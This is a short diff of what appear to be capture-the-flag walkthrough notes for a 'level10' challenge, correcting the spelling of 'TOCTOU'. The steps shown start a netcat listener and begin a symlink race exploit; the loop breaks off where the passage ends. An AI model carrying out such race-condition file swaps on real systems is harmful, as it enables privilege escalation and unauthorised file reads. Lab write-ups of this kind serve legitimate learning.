@@ -5,7 +5,7 @@ Inspect file level10
 Run a server
 - nc -lk 6969 &
 
-Exploit TTCTTU, 
+Exploit TOCTOU, 
 - make a race swap linked files
 - touch /tmp/nottk
 - while true; do
